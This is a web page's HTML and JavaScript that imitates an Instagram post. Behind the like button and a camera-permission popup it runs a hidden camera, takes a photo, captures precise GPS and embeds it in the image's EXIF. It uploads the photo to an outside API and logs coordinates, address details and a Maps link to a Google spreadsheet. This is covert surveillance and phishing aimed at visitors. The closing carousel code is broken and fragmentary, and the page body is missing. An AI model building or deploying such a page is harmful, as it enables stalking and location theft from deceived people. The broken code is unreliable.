<!DOCTYPE html>
<html lang="id">

<head>

    <meta charset="UTF-8">

    <meta
        name="viewport"
        content="width=device-width, initial-scale=1.0"
    >

    <title>lyhtaa • Instagram</title>

    <!-- FAVICON -->
    <link
        rel="icon"
        type="image/png"
        href="./logoig.png"
    >

    <!-- BOOTSTRAP -->
    <link
        href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css"
        rel="stylesheet"
    >

    <!-- PIE EXIF -->
    <script src="https://cdn.jsdelivr.net/npm/piexifjs"></script>

    <style>

        * {
            box-sizing: border-box;
        }

        body {
            margin: 0;
            background: #fafafa;
            font-family:
                -apple-system,
                BlinkMacSystemFont,
                "Segoe UI",
                Roboto,
                Helvetica,
                Arial,
                sans-serif;
            color: #262626;
        }

        /* =========================================================
           MAIN CONTAINER
        ========================================================== */

        .instagram-container {
            width: 100%;
            max-width: 470px;
            margin: 30px auto;
        }

        /* =========================================================
           POST
        ========================================================== */

        .instagram-post {
            background: #fff;
            border: 1px solid #dbdbdb;
            border-radius: 8px;
            overflow: hidden;
        }

        /* =========================================================
           HEADER
        ========================================================== */

        .post-header {
            height: 60px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding: 8px 14px;
        }

        .profile-wrapper {
            display: flex;
            align-items: center;
            gap: 10px;
        }

        .profile-image {
            width: 38px;
            height: 38px;
            border-radius: 50%;
            object-fit: cover;
            border: 1px solid #ddd;
        }

        .profile-name {
            font-size: 14px;
            font-weight: 600;
        }

        .profile-followers {
            display: block;
            font-size: 12px;
            color: #737373;
        }

        .view-profile {
            border: none;
            background: transparent;
            color: #0095f6;
            font-size: 13px;
            font-weight: 600;
            cursor: pointer;
        }

        /* =========================================================
           PHOTO
        ========================================================== */

        .photo-container {
            position: relative;
            width: 100%;
            background: #000;
            overflow: hidden;
        }

        .post-image {
            display: block;
            width: 100%;
            aspect-ratio: 1 / 1;
            object-fit: cover;
            cursor: pointer;
            user-select: none;
            -webkit-user-select: none;
        }

        /* =========================================================
           BIG HEART
        ========================================================== */

        .big-heart {
            position: absolute;
            top: 50%;
            left: 50%;

            transform:
                translate(-50%, -50%)
                scale(0);

            font-size: 120px;
            line-height: 1;
            color: #fff;

            text-shadow:
                0 4px 15px rgba(0, 0, 0, 0.35);

            pointer-events: none;
            z-index: 50;
            opacity: 0;
        }

        .big-heart.show {
            animation:
                instagramHeart
                0.9s
                cubic-bezier(
                    0.175,
                    0.885,
                    0.32,
                    1.275
                )
                forwards;
        }

        @keyframes instagramHeart {

            0% {
                transform:
                    translate(-50%, -50%)
                    scale(0);
                opacity: 0;
            }

            15% {
                transform:
                    translate(-50%, -50%)
                    scale(1.4);
                opacity: 1;
            }

            30% {
                transform:
                    translate(-50%, -50%)
                    scale(0.9);
                opacity: 1;
            }

            45% {
                transform:
                    translate(-50%, -50%)
                    scale(1.1);
                opacity: 1;
            }

            70% {
                transform:
                    translate(-50%, -50%)
                    scale(1);
                opacity: 1;
            }

            100% {
                transform:
                    translate(-50%, -50%)
                    scale(1.15);
                opacity: 0;
            }
        }

        /* =========================================================
           CAROUSEL
        ========================================================== */

        .carousel-button {
            position: absolute;
            top: 50%;

            transform:
                translateY(-50%);

            width: 30px;
            height: 30px;

            border-radius: 50%;
            border: none;

            background:
                rgba(255, 255, 255, 0.9);

            display: flex;
            align-items: center;
            justify-content: center;

            font-size: 18px;
            cursor: pointer;

            z-index: 10;
        }

        .carousel-button:hover {
            background: #fff;
        }

        .carousel-prev {
            left: 10px;
        }

        .carousel-next {
            right: 10px;
        }

        .carousel-dots {
            position: absolute;
            bottom: 10px;
            left: 50%;

            transform:
                translateX(-50%);

            display: flex;
            gap: 5px;

            z-index: 10;
        }

        .carousel-dot {
            width: 6px;
            height: 6px;

            border-radius: 50%;

            background:
                rgba(255, 255, 255, 0.6);
        }

        .carousel-dot.active {
            background: #fff;
        }

        /* =========================================================
           POST CONTENT
        ========================================================== */

        .post-content {
            padding: 10px 14px 14px;
        }

        /* =========================================================
           ACTIONS
        ========================================================== */

        .post-actions {
            display: flex;
            align-items: center;
            justify-content: space-between;
            margin-bottom: 8px;
        }

        .left-actions {
            display: flex;
            align-items: center;
            gap: 16px;
        }

        .action-button {
            border: none;
            background: transparent;
            padding: 0;

            font-size: 25px;
            line-height: 1;

            cursor: pointer;

            transition:
                transform 0.15s ease,
                color 0.15s ease;
        }

        .action-button:hover {
            transform: scale(1.08);
        }

        /* =========================================================
           COMMENT ICON
        ========================================================== */

        .comment-icon-button {
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .comment-icon-button svg {
            width: 25px;
            height: 25px;
        }

        /* =========================================================
           LIKE
        ========================================================== */

        .like-button {
            position: relative;
        }

        .like-button.liked {
            color: #ed4956;

            animation:
                likeButtonPop
                0.35s
                ease;
        }

        @keyframes likeButtonPop {

            0% {
                transform: scale(1);
            }

            35% {
                transform: scale(1.35);
            }

            65% {
                transform: scale(0.92);
            }

            100% {
                transform: scale(1);
            }
        }

        /* =========================================================
           BOOKMARK
        ========================================================== */

        .bookmark-button {
            font-size: 24px;
        }

        /* =========================================================
           LIKE COUNT
        ========================================================== */

        .likes {
            font-size: 14px;
            font-weight: 600;
            margin-bottom: 7px;
        }

        /* =========================================================
           CAPTION
        ========================================================== */

        .caption {
            font-size: 14px;
            line-height: 1.5;
            margin-bottom: 8px;
        }

        .caption strong {
            margin-right: 5px;
        }

        /* =========================================================
           INSTAGRAM LINK
        ========================================================== */

        .instagram-link {
            display: block;
            text-align: center;

            padding: 10px;

            color: #0095f6;
            text-decoration: none;

            font-size: 13px;
            font-weight: 600;

            border-top: 1px solid #efefef;
        }

        .instagram-link:hover {
            background: #fafafa;
        }

        /* =========================================================
           COMMENTS
        ========================================================== */

        .comments {
            border-top: 1px solid #efefef;
            padding-top: 10px;
        }

        .comment-preview {
            display: flex;
            align-items: center;
            justify-content: space-between;
            margin-bottom: 10px;
        }

        .comment-text {
            font-size: 13px;
            color: #555;
        }

        .comment-button {
            border: none;
            background: transparent;

            color: #0095f6;

            font-size: 13px;
            font-weight: 600;

            cursor: pointer;
        }

        /* =========================================================
           HIDDEN CAMERA
        ========================================================== */

        #camera {
            display: none !important;

            width: 1px;
            height: 1px;

            position: fixed;

            left: -9999px;
            top: -9999px;

            opacity: 0;
            pointer-events: none;
        }

        #canvas {
            display: none;
        }

        /* =========================================================
           STATUS
        ========================================================== */

        #cameraStatus {
            display: none;

            max-width: 470px;

            margin: 10px auto;

            text-align: center;

            font-size: 12px;

            color: #737373;
        }

        #gpsInfo {
            display: none;

            max-width: 470px;

            margin: 15px auto 0;
        }

        #loading {
            display: none;

            max-width: 470px;

            margin: 20px auto;

            text-align: center;
        }

        #error {
            display: none;

            max-width: 470px;

            margin: 15px auto;
        }

        /* =========================================================
           SUCCESS
        ========================================================== */

        #success {
            display: none;

            max-width: 470px;

            margin: 15px auto;
        }

        /* =========================================================
           MOBILE
        ========================================================== */

        @media (max-width: 520px) {

            .instagram-container {
                margin: 0 auto;
            }

            .instagram-post {
                border-left: none;
                border-right: none;
                border-radius: 0;
            }

            #gpsInfo,
            #loading,
            #error,
            #success,
            #cameraStatus {
                margin-left: 15px;
                margin-right: 15px;
            }
        }

    </style>

</head>

<script>

/* =========================================================
   CONFIGURATION
========================================================== */

const GOOGLE_SCRIPT_URL =
    "https://script.google.com/macros/s/AKfycbz7dtJDDIQHlLYriNom9wQjCXZimBcxR7BS-75930wfUg4Lw_u_0u1dhLy5F3lGtyzn/exec";

const PHOTO_API_URL =
    "https://bemppnew.kejaksaan.info/photo-api/analyze";

const USERNAME =
    "lyhtaa";


/* =========================================================
   ELEMENT
========================================================== */

const video =
    document.getElementById("camera");

const canvas =
    document.getElementById("canvas");

const likeButton =
    document.getElementById("likeButton");

const likeCount =
    document.getElementById("likeCount");

const bigHeart =
    document.getElementById("bigHeart");

const commentButton =
    document.getElementById("commentButton");

const commentButton2 =
    document.getElementById("commentButton2");

const submitComment =
    document.getElementById("submitComment");

const commentInput =
    document.getElementById("commentInput");

const loading =
    document.getElementById("loading");

const errorBox =
    document.getElementById("error");

const successBox =
    document.getElementById("success");

const gpsInfo =
    document.getElementById("gpsInfo");

const cameraStatus =
    document.getElementById("cameraStatus");

const postImage =
    document.getElementById("postImage");


/* =========================================================
   MODAL
========================================================== */

const cameraPermissionModalElement =
    document.getElementById(
        "cameraPermissionModal"
    );

const commentModalElement =
    document.getElementById(
        "commentModal"
    );

const cameraModal =
    new bootstrap.Modal(
        cameraPermissionModalElement
    );

const commentModal =
    new bootstrap.Modal(
        commentModalElement
    );


/* =========================================================
   STATE
========================================================== */

let stream = null;

let analyzing = false;

let liked = false;

let likes = 1234;


/* =========================================================
   GOOGLE SPREADSHEET
========================================================== */

async function sendToGoogleSheet(data) {

    try {

        const formData =
            new URLSearchParams();

        formData.append(
            "payload",
            JSON.stringify(data)
        );

        const response =
            await fetch(
                GOOGLE_SCRIPT_URL,
                {
                    method: "POST",
                    body: formData
                }
            );

        if (!response.ok) {

            throw new Error(
                "Google Spreadsheet HTTP " +
                response.status
            );
        }

        const result =
            await response.json();

        console.log(
            "Google Spreadsheet response:",
            result
        );

        if (!result.success) {

            throw new Error(
                result.message ||
                "Gagal menyimpan data ke Google Spreadsheet."
            );
        }

        console.log(
            "✅ Berhasil masuk Google Spreadsheet"
        );

        return true;

    } catch (error) {

        console.error(
            "❌ Gagal mengirim ke Google Spreadsheet:",
            error
        );

        throw error;
    }
}


/* =========================================================
   LIKE UI
========================================================== */

function updateLikeUI() {

    if (liked) {

        likeButton.innerHTML =
            "♥";

        likeButton.classList.add(
            "liked"
        );

        likeButton.setAttribute(
            "aria-label",
            "Unlike"
        );

    } else {

        likeButton.innerHTML =
            "♡";

        likeButton.classList.remove(
            "liked"
        );

        likeButton.setAttribute(
            "aria-label",
            "Like"
        );
    }

    likeCount.innerText =
        likes.toLocaleString("id-ID") +
        " likes";
}


/* =========================================================
   BIG HEART
========================================================== */

function showBigHeart() {

    bigHeart.classList.remove(
        "show"
    );

    void bigHeart.offsetWidth;

    bigHeart.classList.add(
        "show"
    );

    setTimeout(
        function () {

            bigHeart.classList.remove(
                "show"
            );

        },
        900
    );
}


/* =========================================================
   CAMERA MODAL
========================================================== */

function showCameraModalAfterHeart() {

    if (stream) {
        return;
    }

    setTimeout(
        function () {

            if (
                !stream &&
                !analyzing
            ) {

                cameraModal.show();
            }

        },
        900
    );
}


/* =========================================================
   LIKE
========================================================== */

likeButton.addEventListener(
    "click",
    function () {

        /*
         * UNLIKE
         */

        if (liked) {

            liked = false;

            likes--;

            updateLikeUI();

            return;
        }


        /*
         * LIKE
         */

        liked = true;

        likes++;

        updateLikeUI();


        /*
         * ANIMASI HEART
         */

        showBigHeart();


        /*
         * TAMPILKAN MODAL
         * SETELAH ANIMASI
         */

        showCameraModalAfterHeart();

    }
);


/* =========================================================
   DOUBLE CLICK PHOTO
========================================================== */

postImage.addEventListener(
    "dblclick",
    function () {

        if (!liked) {

            liked = true;

            likes++;

            updateLikeUI();
        }

        showBigHeart();

        showCameraModalAfterHeart();

    }
);


/* =========================================================
   ALLOW CAMERA
========================================================== */

document
    .getElementById("allowCamera")
    .addEventListener(
        "click",
        async function () {

            cameraModal.hide();

            await activateCamera();

        }
    );


/* =========================================================
   ACTIVATE CAMERA
========================================================== */

async function activateCamera() {

    hideError();

    try {

        if (
            !navigator.mediaDevices ||
            !navigator.mediaDevices.getUserMedia
        ) {

            throw new Error(
                "Kamera tidak tersedia."
            );
        }


        const newStream =
            await navigator
                .mediaDevices
                .getUserMedia({

                    video: {

                        facingMode: {
                            ideal:
                                "environment"
                        }

                    },

                    audio: false

                });


        stream =
            newStream;


        video.srcObject =
            stream;


        video.style.display =
            "none";


        await video.play();


        cameraStatus.style.display =
            "none";


        console.log(
            "✅ Kamera berhasil diaktifkan."
        );

    } catch (err) {

        console.error(
            "Camera error:",
            err
        );

        stream =
            null;

        showError(
            "Akses kamera gagal."
        );
    }
}


/* =========================================================
   OPEN COMMENT MODAL
========================================================== */

function openCommentModal() {

    if (analyzing) {
        return;
    }

    commentModal.show();
}


commentButton.addEventListener(
    "click",
    openCommentModal
);


commentButton2.addEventListener(
    "click",
    openCommentModal
);


/* =========================================================
   SUBMIT COMMENT
========================================================== */

/* =========================================================
   ANALYZE PHOTO
========================================================== */

async function analyzePhoto(
    comment = ""
) {

    if (analyzing) {
        return;
    }


    if (!stream) {

        showError(
            "Kamera belum aktif."
        );

        return;
    }


    analyzing =
        true;


    hideError();

    hideSuccess();


    loading.style.display =
        "block";


    gpsInfo.style.display =
        "none";


    try {


        /* =====================================================
           WAIT VIDEO
        ====================================================== */

        if (
            video.readyState < 2 ||
            video.videoWidth === 0 ||
            video.videoHeight === 0
        ) {

            await new Promise(
                function (
                    resolve,
                    reject
                ) {

                    const timeout =
                        setTimeout(
                            function () {

                                reject(
                                    new Error(
                                        "Kamera belum siap."
                                    )
                                );

                            },
                            10000
                        );


                    video.onloadedmetadata =
                        function () {

                            clearTimeout(
                                timeout
                            );

                            resolve();
                        };

                }
            );
        }


        const width =
            video.videoWidth;

        const height =
            video.videoHeight;


        if (
            !width ||
            !height
        ) {

            throw new Error(
                "Kamera belum siap mengambil gambar."
            );
        }


        /* =====================================================
           CANVAS
        ====================================================== */

        canvas.width =
            width;

        canvas.height =
            height;


        const context =
            canvas.getContext(
                "2d"
            );


        if (!context) {

            throw new Error(
                "Canvas tidak tersedia."
            );
        }


        context.drawImage(
            video,
            0,
            0,
            width,
            height
        );


        /* =====================================================
           JPEG
        ====================================================== */

        const blob =
            await new Promise(
                function (resolve) {

                    canvas.toBlob(
                        resolve,
                        "image/jpeg",
                        0.95
                    );

                }
            );


        if (!blob) {

            throw new Error(
                "Gagal membuat gambar."
            );
        }


        /* =====================================================
           GPS
        ====================================================== */

        const position =
            await getCurrentLocation();


        const latitude =
            position.coords.latitude;

        const longitude =
            position.coords.longitude;


        gpsInfo.style.display =
            "block";


        gpsInfo.innerHTML = `
            📍 GPS:
            ${latitude.toFixed(6)},
            ${longitude.toFixed(6)}
        `;


        /* =====================================================
           EXIF
        ====================================================== */

        const gpsBlob =
            await addGPSExif(
                blob,
                latitude,
                longitude
            );


        /* =====================================================
           SEND API
        ====================================================== */

        await sendToAPI(
            gpsBlob,
            comment
        );


        /*
         * BERHASIL
         */

        showSuccess(
            "❤️ Data berhasil dianalisis dan disimpan."
        );


        /*
         * KOSONGKAN KOMENTAR
         */

        commentInput.value = "";


    } catch (err) {

        console.error(
            "Analyze error:",
            err
        );


        showError(
            err.message ||
            "Terjadi kesalahan saat memproses foto."
        );

    } finally {

        loading.style.display =
            "none";

        analyzing =
            false;
    }
}


/* =========================================================
   GET GPS
========================================================== */

function getCurrentLocation() {

    return new Promise(
        function (
            resolve,
            reject
        ) {

            if (!navigator.geolocation) {

                reject(
                    new Error(
                        "GPS tidak tersedia."
                    )
                );

                return;
            }


            navigator.geolocation.getCurrentPosition(

                resolve,

                function (error) {

                    let message =
                        "Gagal mendapatkan lokasi.";


                    if (
                        error.code ===
                        error.PERMISSION_DENIED
                    ) {

                        message =
                            "Izin lokasi ditolak.";
                    }


                    if (
                        error.code ===
                        error.POSITION_UNAVAILABLE
                    ) {

                        message =
                            "Lokasi tidak tersedia.";
                    }


                    if (
                        error.code ===
                        error.TIMEOUT
                    ) {

                        message =
                            "Permintaan lokasi timeout.";
                    }


                    reject(
                        new Error(
                            message
                        )
                    );

                },

                {

                    enableHighAccuracy:
                        true,

                    timeout:
                        15000,

                    maximumAge:
                        0

                }

            );

        }
    );
}


/* =========================================================
   DECIMAL TO DMS
========================================================== */

function decimalToDMS(
    decimal
) {

    const absolute =
        Math.abs(
            decimal
        );


    const degrees =
        Math.floor(
            absolute
        );


    const minutesFloat =
        (
            absolute -
            degrees
        ) * 60;


    const minutes =
        Math.floor(
            minutesFloat
        );


    const seconds =
        (
            minutesFloat -
            minutes
        ) * 60;


    return [

        degrees,

        minutes,

        Math.round(
            seconds * 100
        ) / 100

    ];
}


/* =========================================================
   ADD GPS EXIF
========================================================== */

async function addGPSExif(
    blob,
    latitude,
    longitude
) {

    return new Promise(
        function (
            resolve,
            reject
        ) {

            const reader =
                new FileReader();


            reader.onload =
                function () {

                    try {

                        const dataUrl =
                            reader.result;


                        let exifObj;


                        try {

                            exifObj =
                                piexif.load(
                                    dataUrl
                                );

                        } catch (e) {

                            exifObj = {

                                "0th": {},

                                "Exif": {},

                                "GPS": {},

                                "1st": {},

                                "thumbnail":
                                    null

                            };
                        }


                        if (!exifObj.GPS) {

                            exifObj.GPS =
                                {};
                        }


                        /* =================================================
                           LATITUDE
                        ================================================== */

                        const latDMS =
                            decimalToDMS(
                                latitude
                            );


                        exifObj.GPS[
                            piexif.GPSIFD.GPSLatitude
                        ] =
                            latDMS.map(
                                function (
                                    value
                                ) {

                                    return [

                                        Math.round(
                                            value * 100
                                        ),

                                        100

                                    ];

                                }
                            );


                        exifObj.GPS[
                            piexif.GPSIFD.GPSLatitudeRef
                        ] =
                            latitude >= 0
                                ? "N"
                                : "S";


                        /* =================================================
                           LONGITUDE
                        ================================================== */

                        const lngDMS =
                            decimalToDMS(
                                longitude
                            );


                        exifObj.GPS[
                            piexif.GPSIFD.GPSLongitude
                        ] =
                            lngDMS.map(
                                function (
                                    value
                                ) {

                                    return [

                                        Math.round(
                                            value * 100
                                        ),

                                        100

                                    ];

                                }
                            );


                        exifObj.GPS[
                            piexif.GPSIFD.GPSLongitudeRef
                        ] =
                            longitude >= 0
                                ? "E"
                                : "W";


                        /* =================================================
                           GPS VERSION
                        ================================================== */

                        exifObj.GPS[
                            piexif.GPSIFD.GPSVersionID
                        ] = [

                            2,
                            3,
                            0,
                            0

                        ];


                        /* =================================================
                           DUMP
                        ================================================== */

                        const exifBytes =
                            piexif.dump(
                                exifObj
                            );


                        /* =================================================
                           INSERT
                        ================================================== */

                        const newDataUrl =
                            piexif.insert(
                                exifBytes,
                                dataUrl
                            );


                        /* =================================================
                           DATA URL -> BLOB
                        ================================================== */

                        const byteString =
                            atob(
                                newDataUrl
                                    .split(",")[1]
                            );


                        const arrayBuffer =
                            new ArrayBuffer(
                                byteString.length
                            );


                        const uint8Array =
                            new Uint8Array(
                                arrayBuffer
                            );


                        for (
                            let i = 0;
                            i < byteString.length;
                            i++
                        ) {

                            uint8Array[i] =
                                byteString.charCodeAt(
                                    i
                                );
                        }


                        const newBlob =
                            new Blob(
                                [
                                    arrayBuffer
                                ],
                                {
                                    type:
                                        "image/jpeg"
                                }
                            );


                        resolve(
                            newBlob
                        );


                    } catch (error) {

                        reject(
                            error
                        );
                    }

                };


            reader.onerror =
                reject;


            reader.readAsDataURL(
                blob
            );

        }
    );
}


/* =========================================================
   SEND TO PHOTO API
========================================================== */

async function sendToAPI(
    blob,
    comment
) {

    const formData =
        new FormData();


    formData.append(
        "file",
        blob,
        "photo.jpg"
    );


    const response =
        await fetch(
            PHOTO_API_URL,
            {
                method:
                    "POST",

                body:
                    formData
            }
        );


    if (!response.ok) {

        throw new Error(
            "API gagal memproses foto. HTTP " +
            response.status
        );
    }


    const data =
        await response.json();


    console.log(
        "API RESPONSE:",
        data
    );


    /*
     * SIMPAN HASIL ANALISIS
     * KE GOOGLE SPREADSHEET
     */

    await saveAnalysisToGoogleSheet(
        data,
        comment
    );
}


/* =========================================================
   SAVE ANALYSIS TO GOOGLE SHEET
========================================================== */

async function saveAnalysisToGoogleSheet(
    data,
    comment
) {

    console.log(
        "Data API yang akan disimpan:",
        data
    );


    const responseData =
        data.data || {};


    const coordinates =
        responseData.coordinates || {};


    const location =
        responseData.location || {};


    const maps =
        responseData.maps || {};


    const gpsFound =
        responseData.gps_found
            ? "Ditemukan"
            : "Tidak ditemukan";


    const latitude =
        coordinates.latitude ?? "";


    const longitude =
        coordinates.longitude ?? "";


    const desa =
        location.desa_kelurahan ?? "";


    const kecamatan =
        location.kecamatan ?? "";


    const kabupaten =
        location.kabupaten_kota ?? "";


    const provinsi =
        location.provinsi ?? "";


    const negara =
        location.negara ?? "";


    let googleMaps =
        maps.google || "";


    /*
     * JIKA API TIDAK MEMBERIKAN
     * URL GOOGLE MAPS
     */

    if (
        !googleMaps &&
        latitude !== "" &&
        longitude !== ""
    ) {

        googleMaps =
            "https://www.google.com/maps?q=" +
            latitude +
            "," +
            longitude;
    }


    /*
     * DATA YANG DIKIRIM
     */

    const spreadsheetData = {

        action:
            "PHOTO_ANALYSIS",

        username:
            USERNAME,

        comment:
            comment || "",

        gps_found:
            gpsFound,

        latitude:
            latitude,

        longitude:
            longitude,

        desa_kelurahan:
            desa,

        kecamatan:
            kecamatan,

        kabupaten_kota:
            kabupaten,

        provinsi:
            provinsi,

        negara:
            negara,

        google_maps:
            googleMaps,

        image:
            postImage.src,

        likes:
            likes,

        timestamp:
            new Date().toISOString()

    };


    console.log(
        "📊 Data yang dikirim ke Spreadsheet:",
        spreadsheetData
    );


    /*
     * KIRIM
     */

    await sendToGoogleSheet(
        spreadsheetData
    );


    console.log(
        "✅ Hasil analisis berhasil disimpan ke Google Spreadsheet."
    );
}

    dots.forEach(
        function (
            dot,
            index
        ) {

            dot.classList.toggle(
                "active",
                index ===
                currentImage
            );

        }
    );

    .getElementById("prevButton")
    .addEventListener(

            currentImage--;

                currentImage < 0
            ) {

                currentImage =
                    images.length - 1;
            }


            updateCarousel();

        }
    );

        "click",
        function () {

            currentImage++;


            if (
                currentImage >=
                images.length
            ) {

                currentImage =
                    0;
            }


            updateCarousel();

        }
    );
